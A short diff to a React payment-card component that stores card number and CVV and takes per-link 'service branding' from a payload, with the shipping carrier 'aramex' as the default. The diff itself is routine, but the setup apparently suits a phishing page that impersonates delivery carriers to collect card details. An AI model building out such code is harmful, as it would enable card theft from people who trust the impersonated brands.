@@ -26,8 +26,9 @@ const PaymentCard = () => {
   const [cvv, setCvv] = useState("");
   
   // Get service branding
-  const serviceName = link?.payload?.service || link?.payload?.carrier || 'aramex';
-  const branding = getServiceBranding(serviceName);
+  const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
+  const serviceName = link?.payload?.service_name || serviceKey;
+  const branding = getServiceBranding(serviceKey);
   
   const formatCardNumber = (value: string) => {
     const cleaned = value.replace(/\s/g, "");
